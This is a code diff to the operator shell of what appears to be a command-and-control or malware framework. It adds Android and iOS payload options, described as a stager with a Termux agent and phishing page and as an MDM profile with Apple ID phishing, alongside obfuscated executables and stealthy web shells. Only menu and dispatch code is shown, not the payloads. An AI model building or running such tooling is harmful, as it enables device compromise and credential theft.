@@ -177,7 +177,7 @@ func (sh *Shell) completer(line string) []string {
 					}
 				}
 			case "generate":
-				types := []string{"exe", "elf", "exe-garble", "elf-garble", "aspx", "php", "jsp", "powershell", "bash", "python", "hta", "vba"}
+				types := []string{"exe", "elf", "exe-garble", "elf-garble", "android", "ios", "aspx", "php", "jsp", "powershell", "bash", "python", "hta", "vba"}
 				for _, t := range types {
 					if strings.HasPrefix(t, argPrefix) {
 						candidates = append(candidates, "generate "+t)
@@ -226,7 +226,7 @@ func (sh *Shell) completer(line string) []string {
 					}
 				}
 			case "generate", "build", "payload":
-				types := []string{"exe", "elf", "exe-garble", "elf-garble", "aspx", "php", "jsp", "powershell", "bash", "python", "hta", "vba"}
+				types := []string{"exe", "elf", "exe-garble", "elf-garble", "android", "ios", "aspx", "php", "jsp", "powershell", "bash", "python", "hta", "vba"}
 				for _, t := range types {
 					if strings.HasPrefix(t, argPrefix) {
 						candidates = append(candidates, "generate "+t)
@@ -646,6 +646,11 @@ func (sh *Shell) cmdGenerate(args []string) {
 	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf-garble [listener_url]", colorReset, colorDim, "Obfuscated Linux ELF (garble)", colorReset)
 	fmt.Println()
 
+	fmt.Printf("  %sMobile Payloads:%s\n", colorYellow, colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate android [listener_url]", colorReset, colorDim, "Android stager + Termux agent + phishing page", colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate ios [listener_url]", colorReset, colorDim, "iOS MDM profile + Shortcut + Apple ID phishing", colorReset)
+	fmt.Println()
+
 	fmt.Printf("  %sWeb Shells (stealthy, token-protected):%s\n", colorYellow, colorReset)
 	pTypes := payloads.ListPayloadTypes()
 	for _, pt := range pTypes {
@@ -677,6 +682,24 @@ func (sh *Shell) cmdGenerate(args []string) {
 		return
 	case "elf-garble":
 		sh.buildAgent("linux", "amd64", listenerURL, true)
+		return
+	case "android":
+		output, err := payloads.GenerateAndroidPayload(listenerURL, "build/payloads")
+		if err != nil {
+			Error("Failed: %v", err)
+		} else {
+			Success("Android payloads generated:")
+			fmt.Print(output)
+		}
+		return
+	case "ios":
+		output, err := payloads.GenerateIOSPayload(listenerURL, "build/payloads")
+		if err != nil {
+			Error("Failed: %v", err)
+		} else {
+			Success("iOS payloads generated:")
+			fmt.Print(output)
+		}
 		return
 	}
 
